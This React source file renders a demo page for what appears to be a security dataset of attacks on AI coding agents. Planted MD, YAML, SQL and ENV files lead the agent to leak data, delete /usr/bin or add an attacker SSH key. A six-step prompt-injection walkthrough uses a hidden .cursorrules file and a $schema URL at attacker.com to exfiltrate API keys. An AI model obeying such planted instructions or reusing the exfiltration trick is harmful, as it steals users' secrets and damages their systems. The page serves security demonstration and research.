"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, Play, CheckCircle2 } from "lucide-react"
import { Badge } from "@/components/ui/badge"
import { cn } from "@/lib/utils"

// 数据集信息
const datasetInfo: Record<string, { 
  title: string; 
  category: string; 
  description: string;
  videoPath?: string;
  attackType?: string;
  riskLevel?: "low" | "medium" | "high" | "critical";
  steps?: { title: string; description: string }[];
}> = {
  "1": {
    title: "Dataset1 - Data Leakage",
    category: "data leakage",
    description: "Demonstration of credential and user information leakage vulnerabilities",
    videoPath: "/demo-video/1-Data_Leakage.mp4",
    attackType: "Information Disclosure",
    riskLevel: "high",
    steps: [
      {
        title: "External malicious MD file introduced",
        description: "The user's workspace is introduced to an external MD file containing an attack payload of the \"Data Leakage\" type."
      },
      {
        title: "Agent Instructed to Run File",
        description: "The user instructs the coding agent to operate according to the external MD file."
      },
      {
        title: "Attack Success",
        description: "The payload in the MD file is executed, leaking user information and sending it to the attacker's web server, resulting in a successful attack."
      }
    ]
  },
  "2": {
    title: "Dataset2 - Host Environment Destruction",
    category: "host environment destruction",
    description: "Demonstration of file system destruction and privilege escalation attacks",
    videoPath: "/demo-video/2-Host_Env_Destruction.mp4",
    attackType: "System Compromise",
    riskLevel: "critical",
    steps: [
      {
        title: "External malicious YAML file introduced",
        description: "The user's workspace is introduced to an external YAML file containing an attack payload of the \"Host Environment Destruction\" type."
      },
      {
        title: "Agent Instructed to Run File",
        description: "The user instructs the coding agent to operate according to the external YAML file."
      },
      {
        title: "Attack Success",
        description: "The payload in the YAML file is executed, deleting all files in /usr/bin directory, resulting in a successful attack."
      }
    ]
  },
  "3": {
    title: "Dataset3 - Harmful Code Generation",
    category: "harmful code generation",
    description: "Demonstration of malicious code generation and supply chain poisoning",
    videoPath: "/demo-video/3-Harmful_Code_Gen.mp4",
    attackType: "Code Injection",
    riskLevel: "critical",
    steps: [
      {
        title: "External malicious SQL file introduced",
        description: "The user's workspace is introduced to an external SQL file containing an attack payload of the \"Harmful Code Generation\" type."
      },
      {
        title: "Agent Instructed to Run File",
        description: "The user instructs the coding agent to operate according to the external SQL file."
      },
      {
        title: "Attack Success",
        description: "The payload in the SQL file is executed, generating code containing SQL vulnerabilities, resulting in a successful attack."
      }
    ]
  },
  "4": {
    title: "Dataset4 - Resource Misuse",
    category: "resource misuse",
    description: "Demonstration of token and system resource exploitation",
    videoPath: "/demo-video/4-Resource_Misuse.mp4",
    attackType: "Resource Exhaustion",
    riskLevel: "medium",
    steps: [
      {
        title: "External malicious ENV file introduced",
        description: "The user's workspace is introduced to an external ENV file containing an attack payload of the \"Resource Misuse\" type."
      },
      {
        title: "Agent Instructed to Run File",
        description: "The user instructs the coding agent to operate according to the external ENV file."
      },
      {
        title: "Attack Success",
        description: "The payload in the ENV file is executed, occupying disk space, resulting in a successful attack."
      }
    ]
  },
  "5": {
    title: "Dataset5 - Context Pollution",
    category: "context pollution",
    description: "Demonstration of malicious instruction persistence through context pollution",
    videoPath: "/demo-video/5-Context_Pollution(malicious_instruction_persistence.mp4",
    attackType: "Context Injection",
    riskLevel: "high",
    steps: [
      {
        title: "External malicious YAML file introduced",
        description: "The user's workspace is introduced to an external YAML file containing an attack payload of the \"Context Pollution\" type."
      },
      {
        title: "Agent Instructed to Run File",
        description: "The user instructs the coding agent to operate according to the external YAML file."
      },
      {
        title: "Attack Success",
        description: "The payload in the YAML file is executed, adding the attacker's public key to the /root/.ssh/authorized_keys file, resulting in a successful attack."
      }
    ]
  },
  "6": {
    title: "Dataset6 - IDE-Specific Vulnerabilities",
    category: "ide-specific vulnerabilities",
    description: "Demonstration of IDE configuration exploits and prompt injection attacks",
    videoPath: "/demo-video/6-IDE_specific.mp4",
    attackType: "Configuration Exploit",
    riskLevel: "critical"
  }
}

// Risk level colors
const riskLevelColors = {
  low: "bg-emerald-500/10 text-emerald-400 border-emerald-500/30",
  medium: "bg-yellow-500/10 text-yellow-400 border-yellow-500/30",
  high: "bg-orange-500/10 text-orange-400 border-orange-500/30",
  critical: "bg-red-500/10 text-red-400 border-red-500/30",
}

// Video Demo Component with Steps (for datasets 1-5)
function VideoWithStepsDemo({ datasetId, info }: { 
  datasetId: string; 
  info: typeof datasetInfo[keyof typeof datasetInfo] 
}) {
  const [isPlaying, setIsPlaying] = useState(false)
  const [currentStep, setCurrentStep] = useState(0)
  const [isVisible, setIsVisible] = useState(false)

  useEffect(() => {
    setIsVisible(true)
  }, [])

  if (!info.videoPath || !info.steps) return null

  const steps = info.steps

  return (
    <div className="max-w-7xl mx-auto">
      {/* Hero Section */}
      <div className={cn(
        "text-center mb-10 opacity-0",
        isVisible && "animate-fade-in-up"
      )}>
        <div className="inline-flex items-center gap-2 mb-4">
          <Badge className={cn("font-mono", info.riskLevel && riskLevelColors[info.riskLevel])}>
            {info.riskLevel?.toUpperCase()}
          </Badge>
          <span className="text-sm text-muted-foreground">{info.attackType}</span>
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3">
          {info.title.split(' - ')[1]}
        </h2>
        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
          {info.description}
        </p>
      </div>

      {/* Main Content: Video Left, Steps Right */}
      <div className={cn(
        "grid lg:grid-cols-2 gap-6 mb-12 opacity-0",
        isVisible && "animate-fade-in-up stagger-2"
      )}>
        {/* Video Player - Left Side */}
        <div>
          <div className="relative rounded-xl overflow-hidden border border-border shadow-2xl bg-black">
            <video
              className="w-full h-auto"
              style={{ aspectRatio: '990/850' }}
              controls
              preload="metadata"
              onPlay={() => setIsPlaying(true)}
              onPause={() => setIsPlaying(false)}
            >
              <source 
                src={info.videoPath} 
                type="video/mp4" 
              />
              Your browser does not support the video tag.
            </video>
            
            {/* Play overlay when paused */}
            {!isPlaying && (
              <div className="absolute inset-0 flex items-center justify-center bg-black/30 pointer-events-none">
                <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center shadow-lg shadow-primary/30">
                  <Play className="h-6 w-6 text-white ml-1" fill="white" />
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Steps - Right Side */}
        <div>
          <div className="h-full rounded-xl border border-border bg-card/40 glass p-6 flex flex-col">
            {/* Header */}
            <div className="flex items-center justify-between mb-6">
              <h3 className="font-mono text-sm uppercase tracking-wider text-primary flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-primary animate-pulse" />
                Attack Flow
              </h3>
              <Badge className={cn("font-mono text-xs", info.riskLevel && riskLevelColors[info.riskLevel])}>
                {info.riskLevel?.toUpperCase()}
              </Badge>
            </div>

            {/* Progress Indicator */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-2">
                {steps.map((_, index) => (
                  <div
                    key={index}
                    className={cn(
                      "flex-1 h-1.5 rounded-full mx-0.5 transition-all duration-300",
                      index <= currentStep ? "bg-primary" : "bg-secondary/50"
                    )}
                  />
                ))}
              </div>
              <p className="text-xs text-muted-foreground text-center">
                Step {currentStep + 1} of {steps.length}
              </p>
            </div>
            
            {/* Current Step Display */}
            <div className="flex-1 space-y-4">
              {steps.map((step, index) => (
                <div
                  key={index}
                  className={cn(
                    "rounded-lg border transition-all duration-500 cursor-pointer overflow-hidden",
                    currentStep === index 
                      ? "border-primary bg-primary/5 shadow-lg shadow-primary/10" 
                      : "border-border/50 bg-secondary/20 hover:border-border hover:bg-secondary/30",
                    "opacity-0 animate-fade-in"
                  )}
                  style={{ animationDelay: `${index * 150 + 300}ms` }}
                  onClick={() => setCurrentStep(index)}
                >
                  <div className="p-4">
                    {/* Step Header */}
                    <div className="flex items-start gap-3">
                      <div className={cn(
                        "w-8 h-8 rounded-full flex items-center justify-center text-sm font-mono font-bold shrink-0 transition-all duration-300",
                        currentStep === index 
                          ? "bg-primary text-primary-foreground shadow-md" 
                          : currentStep > index
                            ? "bg-primary/20 text-primary"
                            : "bg-secondary text-muted-foreground"
                      )}>
                        {currentStep > index ? (
                          <CheckCircle2 className="h-4 w-4" />
                        ) : (
                          index + 1
                        )}
                      </div>
                      <div className="flex-1 min-w-0">
                        <h4 className={cn(
                          "font-semibold text-base mb-1 transition-colors leading-tight",
                          currentStep === index ? "text-primary" : "text-foreground"
                        )}>
                          {step.title}
                        </h4>
                        <p className={cn(
                          "text-sm text-muted-foreground leading-relaxed transition-all duration-300",
                          currentStep === index ? "opacity-100" : "opacity-70 line-clamp-2"
                        )}>
                          {step.description}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {/* Step Navigation */}
            <div className="mt-6 pt-4 border-t border-border/50">
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
                  disabled={currentStep === 0}
                  className={cn(
                    "flex-1 px-4 py-2.5 rounded-lg text-sm font-medium transition-all",
                    currentStep === 0 
                      ? "text-muted-foreground/40 bg-secondary/30 cursor-not-allowed"
                      : "text-foreground bg-secondary hover:bg-secondary/80"
                  )}
                >
                  ← Previous
                </button>
                <button
                  onClick={() => setCurrentStep(Math.min(steps.length - 1, currentStep + 1))}
                  disabled={currentStep === steps.length - 1}
                  className={cn(
                    "flex-1 px-4 py-2.5 rounded-lg text-sm font-medium transition-all",
                    currentStep === steps.length - 1 
                      ? "text-muted-foreground/40 bg-secondary/30 cursor-not-allowed"
                      : "text-primary-foreground bg-primary hover:bg-primary/90"
                  )}
                >
                  {currentStep === steps.length - 1 ? "Completed ✓" : "Next Step →"}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Attack Info Cards */}
      <div className={cn(
        "grid md:grid-cols-3 gap-4 opacity-0",
        isVisible && "animate-fade-in-up stagger-4"
      )}>
        <div className="p-6 rounded-xl border border-border bg-card/40 text-center">
          <div className={cn(
            "text-xs font-mono uppercase tracking-wider mb-2",
            info.riskLevel === "critical" ? "text-red-400" : 
            info.riskLevel === "high" ? "text-orange-400" : 
            info.riskLevel === "medium" ? "text-yellow-400" : "text-emerald-400"
          )}>
            Attack Vector
          </div>
          <p className="text-sm text-muted-foreground">
            {info.attackType}
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40 text-center">
          <div className={cn(
            "text-xs font-mono uppercase tracking-wider mb-2",
            info.riskLevel === "critical" ? "text-red-400" : 
            info.riskLevel === "high" ? "text-orange-400" : 
            info.riskLevel === "medium" ? "text-yellow-400" : "text-emerald-400"
          )}>
            Risk Level
          </div>
          <p className="text-sm text-muted-foreground">
            {info.riskLevel?.charAt(0).toUpperCase()}{info.riskLevel?.slice(1)} Severity
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40 text-center">
          <div className={cn(
            "text-xs font-mono uppercase tracking-wider mb-2",
            info.riskLevel === "critical" ? "text-red-400" : 
            info.riskLevel === "high" ? "text-orange-400" : 
            info.riskLevel === "medium" ? "text-yellow-400" : "text-emerald-400"
          )}>
            Category
          </div>
          <p className="text-sm text-muted-foreground capitalize">
            {info.category}
          </p>
        </div>
      </div>
    </div>
  )
}

// IDE Vulnerability Demo Component
function IDEVulnerabilityDemo({ info }: { info: typeof datasetInfo[keyof typeof datasetInfo] }) {
  const [currentStep, setCurrentStep] = useState(0)
  const [isPlaying, setIsPlaying] = useState(false)
  const [isVisible, setIsVisible] = useState(false)

  useEffect(() => {
    setIsVisible(true)
  }, [])

  const steps = [
    {
      label: "Clone Project",
      title: "User clones a seemingly normal project",
      code: `$ git clone https://github.com/malicious/project.git
$ cd project
$ ls -la

.cursorrules          # Hidden malicious prompt
package.json
README.md`,
      description: "The project contains a hidden .cursorrules file with carefully crafted malicious prompts."
    },
    {
      label: "IDE Configuration",
      title: "CodeBuddy enables dangerous option by default",
      code: `// settings.json
{
  "json.schemaDownload.enable": true,  // Enabled by default
  "json.validate.enable": true
}

// This allows JSON files to download external schemas`,
      description: "This configuration provides network request capabilities for the attack, a typical case of overly broad trust boundaries."
    },
    {
      label: "Request Help",
      title: "Triggering the malicious prompt",
      code: `User: "Help me configure the project settings"

AI Agent reading project context...
[Reading] .cursorrules
[Executing] Hidden malicious instructions...`,
      description: "The malicious prompt is read and executed by the Agent at this moment, completely unknown to the user."
    },
    {
      label: "Generate File",
      title: "Agent generates JSON with malicious payload",
      code: `// config.json (AI generated)
{
  "$schema": "https://attacker.com/exfiltrate?data=...",
  "name": "project-config",
  "settings": {
    "apiKey": "\${process.env.API_KEY}"
  }
}`,
      description: "The $schema field points to the attacker's server, ready to steal environment variables and sensitive information."
    },
    {
      label: "Send Request",
      title: "IDE automatically sends HTTP request",
      code: `# Network request log
GET https://attacker.com/exfiltrate?data=... HTTP/1.1

Leaked information:
- API keys
- Database passwords
- Project paths
- User information`,
      description: "Without the user's knowledge, sensitive data has been sent to the attacker's server via HTTP request."
    },
    {
      label: "Data Breach",
      title: "Attacker successfully obtains sensitive information",
      code: `# Data received by attacker's server
{
  "apiKey": "sk-xxxxxxxxxxxxx",
  "dbPassword": "MySecretP@ss123",
  "projectPath": "/Users/dev/project",
  "timestamp": "2025-01-15T10:30:00Z"
}`,
      description: "Attack successful. The attacker can use these credentials to access databases, API services, or conduct further attacks."
    }
  ]

  const progress = ((currentStep + 1) / steps.length) * 100

  return (
    <div className="max-w-6xl mx-auto">
      {/* Hero Section */}
      <div className={cn(
        "text-center mb-12 opacity-0",
        isVisible && "animate-fade-in-up"
      )}>
        <div className="inline-flex items-center gap-2 mb-4">
          <Badge className="bg-red-500/10 text-red-400 border-red-500/30 font-mono">
            CRITICAL
          </Badge>
          <span className="text-sm text-muted-foreground">CodeBuddy 4.1.1</span>
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3">
          IDE-Specific Vulnerability
        </h2>
        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
          Prompt Injection + IDE Configuration Exploit
        </p>
      </div>

      {/* Video + Steps Layout */}
      <div className={cn(
        "grid lg:grid-cols-2 gap-6 mb-12 opacity-0",
        isVisible && "animate-fade-in-up stagger-2"
      )}>
        {/* Video Player - Left Side */}
        <div>
          <div className="relative rounded-xl overflow-hidden border border-border shadow-2xl bg-black">
            <video
              className="w-full h-auto"
              style={{ aspectRatio: '990/850' }}
              controls
              preload="metadata"
              onPlay={() => setIsPlaying(true)}
              onPause={() => setIsPlaying(false)}
            >
              <source 
                src={info.videoPath || "/demo-video/6-IDE_specific.mp4"} 
                type="video/mp4" 
              />
              Your browser does not support the video tag.
            </video>
            
            {!isPlaying && (
              <div className="absolute inset-0 flex items-center justify-center bg-black/30 pointer-events-none">
                <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center shadow-lg shadow-primary/30">
                  <Play className="h-6 w-6 text-white ml-1" fill="white" />
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Code Preview - Right Side */}
        <div>
          <div className="h-full rounded-xl border border-border bg-card/40 glass overflow-hidden flex flex-col">
            {/* Step Labels */}
            <div className="flex items-center gap-1 p-3 border-b border-border/50 bg-secondary/30 overflow-x-auto">
              {steps.map((step, index) => (
                <button
                  key={index}
                  onClick={() => setCurrentStep(index)}
                  className={cn(
                    "px-2 py-1 rounded text-[10px] font-mono whitespace-nowrap transition-all",
                    index === currentStep 
                      ? "bg-primary text-primary-foreground" 
                      : "text-muted-foreground hover:text-foreground hover:bg-secondary"
                  )}
                >
                  {index + 1}
                </button>
              ))}
            </div>

            {/* Code Content */}
            <div className="flex-1 p-4 overflow-hidden">
              <div className="mb-3">
                <span className="font-mono text-xs text-primary">Step {currentStep + 1}</span>
                <h4 className="font-semibold text-sm mt-1">{steps[currentStep].title}</h4>
              </div>
              <div className="rounded-lg bg-black/60 p-4 mb-3 overflow-auto max-h-48">
                <pre className="text-gray-300 leading-relaxed font-mono text-xs">
                  {steps[currentStep].code}
                </pre>
              </div>
              <p className="text-xs text-muted-foreground leading-relaxed">
                {steps[currentStep].description}
              </p>
            </div>

            {/* Progress */}
            <div className="p-3 border-t border-border/50">
              <div className="h-1 bg-secondary/30 rounded-full overflow-hidden mb-2">
                <div 
                  className="h-full bg-gradient-to-r from-emerald-500 via-yellow-500 to-red-500 transition-all duration-500"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <div className="flex items-center justify-between">
                <button
                  onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
                  disabled={currentStep === 0}
                  className={cn(
                    "text-xs font-mono transition-all",
                    currentStep === 0 ? "text-muted-foreground/40" : "text-muted-foreground hover:text-primary"
                  )}
                >
                  ← Prev
                </button>
                <span className="font-mono text-xs text-muted-foreground">
                  {currentStep + 1}/{steps.length}
                </span>
                <button
                  onClick={() => setCurrentStep(Math.min(steps.length - 1, currentStep + 1))}
                  disabled={currentStep === steps.length - 1}
                  className={cn(
                    "text-xs font-mono transition-all",
                    currentStep === steps.length - 1 ? "text-muted-foreground/40" : "text-muted-foreground hover:text-primary"
                  )}
                >
                  Next →
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Analysis Cards */}
      <div className={cn(
        "grid md:grid-cols-3 gap-4 opacity-0",
        isVisible && "animate-fade-in-up stagger-4"
      )}>
        <div className="text-center p-6 rounded-xl border border-border bg-card/40">
          <div className="text-xs font-mono uppercase tracking-wider text-red-400 mb-2">
            Attack Entry
          </div>
          <p className="text-sm text-muted-foreground">
            Malicious Prompt Injection
          </p>
        </div>
        <div className="text-center p-6 rounded-xl border border-border bg-card/40">
          <div className="text-xs font-mono uppercase tracking-wider text-orange-400 mb-2">
            Capability Amplification
          </div>
          <p className="text-sm text-muted-foreground">
            IDE Default Configuration
          </p>
        </div>
        <div className="text-center p-6 rounded-xl border border-border bg-card/40">
          <div className="text-xs font-mono uppercase tracking-wider text-yellow-400 mb-2">
            Final Risk
          </div>
          <p className="text-sm text-muted-foreground">
            Sensitive Data Leakage
          </p>
        </div>
      </div>
    </div>
  )
}

export function DemoPageContent({ datasetId }: { datasetId: string }) {
  const router = useRouter()
  const info = datasetInfo[datasetId] || datasetInfo["1"]

  return (
    <section className="px-4 sm:px-6 py-12 sm:py-20 min-h-screen">
      <div className="mx-auto max-w-7xl">
        {/* Header */}
        <div className="mb-12">
          <button
            onClick={() => router.push(`/datasets/${datasetId}`)}
            className="flex items-center gap-2 font-mono text-xs text-muted-foreground hover:text-primary transition-colors mb-6"
          >
            <ArrowLeft className="h-3.5 w-3.5" />
            Back to Dataset
          </button>

          <Badge className="font-mono text-xs uppercase mb-3 bg-primary/10 text-primary border-primary/30">
            {info.category}
          </Badge>
          <h1 className="text-3xl sm:text-4xl font-bold tracking-tight mb-2">
            {info.title}
          </h1>
          <p className="text-muted-foreground">
            {info.description}
          </p>
        </div>

        {/* Demo Content - 根据datasetId渲染不同的demo组件 */}
        {datasetId === "6" ? (
          <IDEVulnerabilityDemo info={info} />
        ) : info.videoPath && info.steps ? (
          <VideoWithStepsDemo datasetId={datasetId} info={info} />
        ) : (
          <div className="text-center py-20">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-secondary/20 mb-4">
            </div>
            <h2 className="text-xl font-semibold mb-2">
              Demo Coming Soon
            </h2>
            <p className="text-muted-foreground mb-6">
              The interactive demo for this category is under development
            </p>
            <button
              onClick={() => router.push(`/datasets/${datasetId}`)}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-lg border border-border hover:bg-secondary/50 transition-colors"
            >
              <ArrowLeft className="h-4 w-4" />
              Back to Dataset
            </button>
          </div>
        )}
      </div>
    </section>
  )
}
